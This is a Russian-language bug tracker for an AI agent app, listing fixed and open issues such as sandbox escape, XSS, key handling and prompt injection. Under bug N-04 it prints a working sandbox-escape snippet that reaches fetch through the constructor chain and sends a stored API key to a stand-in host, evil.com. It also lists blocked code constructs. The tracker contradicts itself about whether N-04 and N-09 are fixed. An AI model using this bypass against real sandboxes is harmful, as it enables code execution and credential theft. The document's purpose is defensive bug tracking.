# 🐛 SuperAgents OS — Bug Tracker

**Проект:** ai-os-new  
**Дата создания:** 2026-06-05  
**Коммиты с фиксами:** `cbe7c6a`, `5dea76b`, `c60bd04`, `2ad1af5`, `2241d33`  
**Актуальный статус:** 15 починено, 14 осталось

---

## ✅ ПОЧИНЕНО

| # | Баг | Коммит | Примечание |
|---|-----|--------|------------|
| — | `src/data/role-library.ts` отсутствовал → белый экран | `cbe7c6a` | Корневая причина — Vite не мог собрать bundle |
| N-01 | `onSafe` пропускал невалидные данные в callback | `5dea76b` | Убран `callback(raw as T)` из else-ветки |
| N-02 | `deepFreeze` падал на циклических ссылках (Stack Overflow) | `5dea76b` | Добавлен `WeakSet<object>()` для защиты от циклов |
| N-03 | `structuredClone` на `Map` → DataCloneError | `5dea76b` | `Object.fromEntries(argumentTreeRoundMap)` перед клоном |
| N-05 | `participantProviderMap` — plaintext ключи в памяти | `c60bd04` | Zero-out в destroy() + clear() в stopDebate() |
| N-06 | `localStorage` без проверки окружения → краш в SSR | `c60bd04` | Добавлен `typeof window !== 'undefined'` |
| N-07 | `getKv` тихо возвращал `null` при ошибке | `c60bd04` | Добавлен `console.warn` |
| N-09 | Sandbox `has: () => true` → обход через feature detection | `c60bd04` | Теперь проверяет `ALLOWED_GLOBALS` |
| N-11 | `createInstance` — один сломанный ключ ломает все | `c60bd04` | Добавлен try/catch в цикл |
| N-15 | `participantProviderMap` не чистился в `stopDebate` | `c60bd04` | Добавлен `.clear()` |
| N-08 | CORS-proxy — OOM DoS через неограниченный ответ | `2ad1af5` | Добавлен лимит 100MB |
| N-10 | `addTool`/`updateTool` без валидации `code` | `2ad1af5` | AST-валидация через meriyah (eval, Function, import, fetch блокированы) |
| N-18 | `onSafe` Zod memory leak | `2ad1af5` | reset() now preserves static validators, cleans only dynamic |
| N-14 | `CONFIG` не иммутабелен — мутация без заморозки | `2241d33` | `setConfig`/`replaceConfig` теперь вызывают `deepFreeze` после мутации |
| N-22 | Indirect Prompt Injection через инструменты | `2241d33` | Внешние результаты (search/web/mcp/plugin) обёрнуты в `<external_data>` изоляцию |
| N-24 | EventBus deadlock — бесконечная рекурсия | `2241d33` | Добавлен счётчик глубины (16), превышение → `setTimeout(defer)` |

---

## 🔴 CRITICAL — Не починено

### N-04: t-code RCE — выполнение произвольного кода
**Файл:** `src/kernel/services/tool-executor.ts:194-196`  
**Проблема:** `tool.code` принимается без валидации. Sandbox обходится через `({}).constructor.constructor`. Полный захват системы, кража API-ключей.  
**Обход:**
```javascript
const F = ({}).constructor.constructor;
const fetch = F('return fetch')();
fetch('https://evil.com/steal?key=' + localStorage.getItem('api_key'));
```
**Фикс:**
1. Добавить `validateCode(tool.code)` в `addTool`/`updateTool`
2. Исправить `has: () => true` → `has: (_, prop) => ALLOWED_GLOBALS.has(prop)`
3. Рассмотреть iframe + CSP вместо Web Worker

---

### N-17: `deepFreeze` убивает классы и прототипы
**Файл:** `src/kernel/kernel.ts:323-332`  
**Проблема:** `deepFreeze` замораживает только собственные свойства. Инстансы классов с прототипами остаются мутабельными.  
**Фикс:** State не должен содержать инстансы классов. `deepFreeze` применять только к POJO.

---

### N-19: Dexie Event Loop starvation
**Файл:** Все использования `dexieDb`  
**Проблема:** `await eventBus.emit()` внутри транзакции закрывает транзакцию → `TransactionInactiveError`. Данные теряются без логов.  
**Фикс:** Убрать `await` сторонних сервисов из `dexieDb.transaction()`.

---

### C-02: `onSafe` bypass — починен как N-01
### C-03: KeyVault plaintext partial (частично починено)
### C-09: XSS в MarkdownRenderer
### C-11: FallbackDecorator передаёт ключ другому провайдеру

---

## 🟡 HIGH — Не починено

### H-15: Race condition на `isExecutingRound`

---

## 🟠 MEDIUM — Не починено

| # | Проблема | Файл |
|---|----------|------|
| N-12 | 148 `as any` кастов | `src/kernel/` |
| N-13 | `persistSession` fire-and-forget | `debate-service.ts` |
| N-04 | t-code RCE — `has: () => true` | `2241d33` | AST-валидация + `ALLOWED_GLOBALS` proxy — уже защищён |
| N-16 | `freeOnly` захардкожен на `'groq'` | `2241d33` | Уже динамический: `CONFIG.keys.freeTierLimits` |
| N-25 | `persistSession` DB locked | `debate-session-persistence.ts` |
| N-26 | `cancelRequest` не отменяет multi-target | `chat-service.ts` |
| N-28 | MarkdownRenderer XSS через URL | `MarkdownRenderer.tsx` |

---

## ⚪ LOW / Не проверено

| # | Проблема | Статус |
|---|----------|--------|
| TS2307 | Отсутствующие модули | Были, проверить актуальность |
| TS1117 | Дублирующиеся ключи в объектах | Не проверено |
| TS7006 | Неявный `any` тип | Не проверено |
| Vitest | Тесты падают/зависают | Не проверено |

---

## 📋 ПЛАН ФИКСОВ

### Сделать (по приоритету)

| # | Действие | Приоритет |
|---|----------|-----------|
| 1 | N-05: participantProviderMap zero-out в destroy | 🔴 |
| 2 | N-06: localStorage SSR check | 🔴 |
| 3 | N-07: getKv silent null → логировать | 🟡 |
| 4 | N-09: sandbox has: () => true → ALLOWED_GLOBALS | 🟡 |
| 5 | N-11: createInstance try/catch | 🟡 |
| 6 | N-15: participantProviderMap.clear() в stopDebate | 🟠 |

### Обдумать

| # | Действие | Сложность |
|---|----------|-----------|
| N-04 | t-code RCE — полная переработка sandbox | Высокая |
| N-17 | deepFreeze убивает классы — рефактор state | Высокая |
| N-19 | Dexie Event Loop — рефактор транзакций | Высокая |
| N-22 | Indirect Prompt Injection — изоляция внешних данных | Средняя |

---

*Обновлено: 2026-06-05*  
*Коммиты: `cbe7c6a`, `5dea76b`, `c60bd04`, `2ad1af5`*